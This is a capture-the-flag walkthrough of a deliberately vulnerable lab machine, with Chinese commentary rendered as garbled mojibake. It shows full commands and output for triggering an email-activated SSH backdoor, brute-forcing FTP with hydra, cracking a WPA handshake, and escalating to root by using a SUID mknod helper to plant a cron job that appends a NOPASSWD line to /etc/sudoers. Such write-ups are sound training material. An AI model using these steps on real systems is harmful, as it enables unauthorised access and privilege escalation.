```
eric:ericdoesntdrinkhisownpee
```
![image-20220715112849126](../../.gitbook/assets/image-20220715112849126.png)
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# cat .notes  
Ugh, this is frustrating.  
I managed to make a system account for myself. I also managed to hide Billy's paper
where he'll never find it.  However, now I can't find it either :-(. 
To make matters worse, my privesc exploits aren't working.  
One sort of worked, but I think I have it installed all backwards.
If I'm going to maintain total control of Billy's miserable life (or what's left of it) 
I need to root the box and find that paper!
Fortunately, my SSH backdoor into the system IS working.  
All I need to do is send an email that includes
the text: "My kid will be a ________ _________"
Hint: https://www.youtube.com/watch?v=6u7RsW5SAgs
The new secret port will be open and then I can login from there with my wifi password, which I'm
sure Billy or Veronica know.  I didn't see it in Billy's FTP folders, but didn't have time to
check Veronica's.
-EG
```
ç»§ç»­â€¦â€¦æ‰€ä»¥æ˜¾ç„¶ç›®æ ‡ä¸Šæœ‰ä¸€ä¸ªåé—¨ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘é€å¸¦æœ‰ç‰¹å®šçŸ­è¯­çš„ç”µå­é‚®ä»¶æ¥å¯ç”¨åé—¨ã€‚è§‚çœ‹é“¾æ¥çš„ YouTube è§†é¢‘åï¼Œæˆ‘è®¤ä¸ºè¿™å¥è¯æ˜¯`My kid will be a soccer player`. æˆ‘å‘é€ä¸€å°ç”µå­é‚®ä»¶ï¼Œå…¶ä¸­åŒ…å«ä½¿ç”¨`swaks`.
```
â”Œâ”€â”€(rootğŸ’€kali)-[/opt]
â””â”€# swaks --to PI:EMAIL --from PI:EMAIL --server 192.168.32.170:2525 --body "My kid will be a soccer player" --header "Subject: My kid will be a soccer player"
=== Trying 192.168.32.170:2525...
=== Connected to 192.168.32.170.
 EHLO kali
 MAIL FROM:
 RCPT TO:
 DATA
.
 -> Date: Fri, 15 Jul 2022 02:19:12 -0400
 -> To: PI:EMAIL
 -> From: PI:EMAIL
 -> Subject: My kid will be a soccer player
 -> Message-Id: 
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> My kid will be a soccer player
 -> 
 -> 
 -> .
 QUIT
 åˆæˆ–è€…è¿™æ ·
>
> ```
> #!/usr/bin/python
> 
> import smtplib
> 
> server = smtplib.SMTP('10.0.2.46', 2525)
> fromaddr = "PI:EMAIL"
> toaddr = "PI:EMAIL"
> msg = "My kid will be a soccer player"
> server.sendmail(fromaddr, toaddr, msg)
> server.quit()
> ```
ç„¶åæˆ‘æ‰§è¡Œå¦ä¸€æ¬¡`nmap`æ‰«æã€‚æœç„¶ï¼Œæˆ‘ä»¬å‘ç°ä¸€ä¸ªæ–°çš„ç«¯å£æ‰“å¼€äº†ã€‚
![image-20220715142408938](../../.gitbook/assets/image-20220715142408938.png)
ç°åœ¨æˆ‘éœ€è¦å¯†ç ã€‚å›åˆ°ä¹‹å‰çš„ç”µå­é‚®ä»¶çº¿ç´¢ï¼Œæˆ‘è®°å¾— Veronica "Rocks"ï¼Œè€Œä¸”å¥¹å¯èƒ½åœ¨å¯†ç ä¸­ä½¿ç”¨äº†å¥¹çš„åå­—ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä» rockyou åˆ›å»ºäº†ä¸€ä¸ªåŒ…å«å•è¯"veronica"çš„å•è¯è¡¨ã€‚
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# hydra -l veronica -P dict ftp://192.168.32.170     
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-15 02:28:22
[DATA] max 16 tasks per 1 server, overall 16 tasks, 773 login tries (l:1/p:773), ~49 tries per task
[DATA] attacking ftp://192.168.32.170:21/
[21][ftp] host: 192.168.32.170   login: veronica   password: PI:EMAIL
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-15 02:28:41
```
ç™»å½•FTPæœåŠ¡å™¨
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# ftp 192.168.32.170                                                                                         255 â¨¯
Connected to 192.168.32.170.
220 Welcome to ColoradoFTP - the open source FTP server (www.coldcore.com)
Name (192.168.32.170:root): veronica
331 User name okay, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
ftp> dir
200 PORT command successful.
150 Opening A mode data connection for /.
-rwxrwxrwx 1 ftp 719128 Aug 17 12:16 eg-01.cap
-rwxrwxrwx 1 ftp 595 Aug 20 12:55 email-from-billy.eml
226 Transfer completed.
ftp> bin
200 Type set to I
ftp> get eg-01.cap
local: eg-01.cap remote: eg-01.cap
200 PORT command successful.
150 Opening I mode data connection for eg-01.cap.
226 Transfer completed for "eg-01.cap".
719128 bytes received in 0.74 secs (948.2698 kB/s)
ftp> get email-from-billy.eml
local: email-from-billy.eml remote: email-from-billy.eml
200 PORT command successful.
150 Opening A mode data connection for email-from-billy.eml.
226 Transfer completed for "email-from-billy.eml".
616 bytes received in 0.46 secs (1.3217 kB/s)
```
> å¯èƒ½ä½ ä½¿ç”¨çš„ä¼ è¾“æ¨¡å¼æ˜¯ASCIIï¼Œè¿™ä¸ªæ¨¡å¼åªèƒ½ç”¨äºä¼ è¾“æ–‡å­—æ–‡ä»¶ã€‚
>
> å¯ä»¥å°è¯•åˆ‡æ¢æˆäºŒè¿›åˆ¶æ¨¡å¼è·å–æ–‡ä»¶è¯•ä¸€ä¸‹ã€‚
>
> ```
> ftp> bin
> ```
>
> åœ¨æˆ‘ä½¿ç”¨getå‘½ä»¤è·å–zipæ–‡ä»¶æ—¶å‘ç°äº†è¿™ä¸ªé—®é¢˜æ€»æ˜¯ç¼ºå°‘å‡ kä»è€Œå€’æ˜¯å‹ç¼©åŒ…ä¸å®Œæ•´è§£å‹å¤±è´¥ï¼Œä½¿ç”¨binæ¨¡å¼å°±å¥½èµ·æ¥äº†ã€‚
>
> 
æŸ¥çœ‹é‚®ä»¶ä¿¡æ¯
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# cat email-from-billy.eml 
        Sat, 20 Aug 2016 12:55:45 -0500 (CDT)
Date: Sat, 20 Aug 2016 12:55:40 -0500
To: PI:EMAIL
From: PI:EMAIL
Subject: test Sat, 20 Aug 2016 12:55:40 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
Eric's wifi
Hey VV,
It's your boy Billy here.  Sorry to leave in the middle of the night but I wanted to crack Eric's wireless and then mess with him.
I wasn't completely successful yet, but at least I got a start.
I didn't walk away without doing my signature move, though.  I left a flaming bag of dog poo on his doorstep. :-)
Kisses,
Billy
```
è¯¥ç”µå­é‚®ä»¶ä¸ºæˆ‘ä»¬æä¾›äº†æœ‰å…³æ•°æ®åŒ…æ•è·å’Œ ssh å¯†ç çš„çº¿ç´¢ï¼Œæ•°æ®åŒ…æ•è·åŒ…å«ç ´è§£ WPA/WPA2 å¯†ç æ‰€éœ€çš„ 4 æ¬¡æ¡æ‰‹ã€‚è¿™å¯ä»¥é€šè¿‡ aircrack-ng æˆ– hashcat æ¥å®Œæˆã€‚
aircrack-ngçˆ†ç ´å¯†ç 
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# aircrack-ng  eg-01.cap -w /usr/share/wordlists/rockyou.txt
```
![image-20220715144744118](../../.gitbook/assets/image-20220715144744118.png)
![image-20220715151305694](../../.gitbook/assets/image-20220715151305694.png)
> hashcatçˆ†ç ´
>
> ```
> aircrack-ng eg-01.cap -J eg-01-hc.cap  
> hashcat -m 2500 eg-01-hc.cap.hccap /usr/share/wordlists/rockyou.txt -w 4
> ```
æ‰¾åˆ°å¯†ç æ˜¯`triscuit*`ï¼Œç™»å½•SSH
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# ssh PI:EMAIL -p 1974                                                                            
The authenticity of host '[192.168.32.170]:1974 ([192.168.32.170]:1974)' can't be established.
ECDSA key fingerprint is SHA256:Iz1zMYr38vrfL6+fiW0fdOAxC2ymMj/um0B6LxPAOLM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.32.170]:1974' (ECDSA) to the list of known hosts.
PI:EMAIL's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-36-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
37 packages can be updated.
0 updates are security updates.
Last login: Sat Aug 20 22:28:28 2016 from 192.168.3.101
eric@BM:~$ 
```
è®©æˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬åœ¨`eric's`ä¸»ç›®å½•ä¸­æœ‰ä»€ä¹ˆå¯ç”¨çš„ã€‚
```
eric@BM:~$ ls -al
total 532
drwxr-xr-x 3 eric eric   4096 Aug 23  2016 .
drwxr-xr-x 6 root root   4096 Aug 20  2016 ..
-rw-r--r-- 1 eric eric    220 Aug 20  2016 .bash_logout
-rw-r--r-- 1 eric eric   3771 Aug 20  2016 .bashrc
drwx------ 2 eric eric   4096 Aug 20  2016 .cache
-rw-r--r-- 1 root root 451085 Aug  7  2016 eric-tongue-animated.gif
-rw-r--r-- 1 root root  60710 Aug  7  2016 eric-unimpressed.jpg
-rw-r--r-- 1 eric eric    655 Aug 20  2016 .profile
-rw-r--r-- 1 root root    115 Aug 20  2016 why-1974.txt
eric@BM:~$ cat why-1974.txt 
Why 1974?  Because: http://www.metacafe.com/watch/an-VB9KuJtnh4bn/billy_madison_1995_billy_hangs_out_with_friends/
```
æˆ‘æ£€æŸ¥äº†ä¸¤å¼ å›¾ç‰‡ï¼Œä½†æ²¡æœ‰ä»»ä½•æœ‰è¶£çš„ä¸œè¥¿å‡ºæ¥ã€‚
æ˜¯æ—¶å€™å°è¯•æå‡äº†ã€‚
ç»è¿‡ä¸€ç•ªæŒ–æ˜ï¼Œå¹¶æ ¹æ®ä¹‹å‰çš„å‘ç°ï¼Œå®ƒçœ‹èµ·æ¥`eric`æœ€åˆä½¿ç”¨äº†è®¸å¤šæ¼æ´åˆ©ç”¨ä¹‹ä¸€æ¥æå‡åˆ°`root`. è¿™äº›æ¼æ´ä¼¼ä¹éƒ½ä¸å†èµ·ä½œç”¨ï¼Œä½†æ˜¯`suid`å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶ã€‚
```
eric@BM:~$ find / -user root -perm -4000 -ls 2>/dev/null
  1454477    368 -r-sr-s---   1 root     eric       372922 Aug 20  2016 /usr/local/share/sgml/donpcgd
  1048829    136 -rwsr-xr-x   1 root     root       136808 May  4  2016 /usr/bin/sudo
  1058216     24 -rwsr-xr-x   1 root     root        23376 Jan 17  2016 /usr/bin/pkexec
  1048745     56 -rwsr-xr-x   1 root     root        54256 Mar 29  2016 /usr/bin/passwd
  1057557     36 -rwsr-xr-x   1 root     root        32944 Mar 29  2016 /usr/bin/newgidmap
  1048609     40 -rwsr-xr-x   1 root     root        40432 Mar 29  2016 /usr/bin/chsh
  1048670     76 -rwsr-xr-x   1 root     root        75304 Mar 29  2016 /usr/bin/gpasswd
  1057558     36 -rwsr-xr-x   1 root     root        32944 Mar 29  2016 /usr/bin/newuidmap
  1048734     40 -rwsr-xr-x   1 root     root        39904 Mar 29  2016 /usr/bin/newgrp
  1048607     52 -rwsr-xr-x   1 root     root        49584 Mar 29  2016 /usr/bin/chfn
  1058246     24 -rwsr-xr-x   1 root     root        23288 Apr 29  2016 /usr/bin/ubuntu-core-launcher
  1048930     12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
  1057498     40 -rwsr-xr-x   1 root     root        38984 Jun 30  2016 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
  1318420     16 -rwsr-xr-x   1 root     root        14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
  1066069    420 -rwsr-xr-x   1 root     root       428240 Aug 11  2016 /usr/lib/openssh/ssh-keysign
  1056767     44 -rwsr-xr--   1 root     messagebus    42992 Apr  1  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1179709     40 -rwsr-xr-x   1 root     root          40152 May 26  2016 /bin/mount
  1179740     40 -rwsr-xr-x   1 root     root          40128 Mar 29  2016 /bin/su
  1179758     28 -rwsr-xr-x   1 root     root          27608 May 26  2016 /bin/umount
  1190647     32 -rwsr-xr-x   1 root     root          30800 Mar 11  2016 /bin/fusermount
  1179724     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
  1179723     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
  1190681    140 -rwsr-xr-x   1 root     root         142032 Feb 17  2016 /bin/ntfs-3g
```
å¦‚æœæˆ‘ä»¬æä¾›ä¸¤ä¸ªè·¯å¾„ï¼Œåˆ™ä¼šåœ¨ç¬¬äºŒä¸ªè·¯å¾„åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥è·¯å¾„å¯ç”±`eric`. æˆ‘ä»¬å¯ä»¥åœ¨_ä»»ä½•_ä½ç½®åˆ›å»ºæ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚
```js
eric@BM:~$ /usr/local/share/sgml/donpcgd /dev/null /etc/testing
#### mknod(/etc/testing,21b6,103)
eric@BM:~$ ls -lah /etc/testing
crw-rw-rw- 1 root root 1, 3 Sep 15 10:22 /etc/testing
```
æˆ‘è¯•å›¾é€šè¿‡åˆ›å»ºä¸€ä¸ª`cron.hourly`æ¡ç›®æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè¯¥æ¡ç›®ä¼šå°†`eric`ç”¨æˆ·æ·»åŠ ä¸º`sudoer`.
```js
eric@BM:~$ touch /tmp/test
eric@BM:~$ /usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/test
#### mknod(/etc/cron.hourly/test,81b4,0)
eric@BM:~$ echo -e '#!/bin/bash\necho "eric ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /etc/cron.hourly/test
eric@BM:~$ chmod +x /etc/cron.hourly/test
eric@BM:~$ cat /etc/cron.hourly/test
#!/bin/bash
echo "eric ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```
ç°åœ¨ï¼Œæˆ‘ç­‰ä¸€ä¸ªå°æ—¶å·¦å³åï¼Œæˆ‘æ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å¯ä»¥`sudo`ã€‚
```js
eric@BM:~$ sudo su
root@BM:/home/eric# id
uid=0(root) gid=0(root) groups=0(root)
root@BM:/home/eric#
```